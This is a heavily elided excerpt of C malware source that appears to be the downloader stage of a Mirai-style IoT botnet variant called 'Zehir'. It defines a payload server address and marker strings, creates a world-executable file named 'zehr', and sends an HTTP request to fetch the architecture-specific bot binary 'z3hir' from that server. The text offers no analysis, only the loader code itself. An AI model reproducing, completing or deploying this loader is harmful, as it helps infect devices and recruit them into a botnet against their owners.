...
#define HTTP_SERVER utils_inet_addr(192,168,1,1) //ip: 127,0,0,1

#define EXEC_MSG            "Zehir\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "zehr\n"
#define DOWNLOAD_MSG_LEN    5
...
inline void run(void)
{
    ...
    ffd = open("zehr", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /zehir/z3hir." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
